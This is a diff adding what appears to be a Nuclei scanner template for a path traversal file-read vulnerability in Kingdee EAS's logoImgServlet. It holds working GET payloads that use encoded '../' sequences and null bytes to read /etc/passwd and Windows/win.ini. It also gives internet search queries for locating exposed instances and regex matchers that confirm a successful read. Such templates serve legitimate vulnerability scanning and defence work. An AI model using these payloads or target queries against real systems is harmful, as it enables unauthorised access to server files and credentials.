@@ -1,0 +1,31 @@
+id: kingdee-eas-logoImgServlet-fileread
+info:
+  name: 金蝶 EAS logoImgServlet - fileread
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/exp999fuck/poc_yaml/blob/main/xray-poc/xray-poc-Kingdee-EAS-logoImgServlet-file-read.yml
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="easSessionId" || header="easportal" || header="eassso/login" || banner="eassso/login" || body="/eassso/common" || (title="EAS系统登录" && body="金蝶")
+    hunter-query: web.body="/eassso/images/"
+    quake-query: app:"金蝶-EAS"
+    zoomeye-query: app:"金蝶 EAS"
+  tags: kingdee,fileread,eas
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/portal/logoImgServlet?language=ch&dataCenter&insId=insId&type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00"
+      - "{{BaseURL}}/portal/logoImgServlet?language=ch&dataCenter&insId=insId&type=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fwin.ini%00"
+        
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
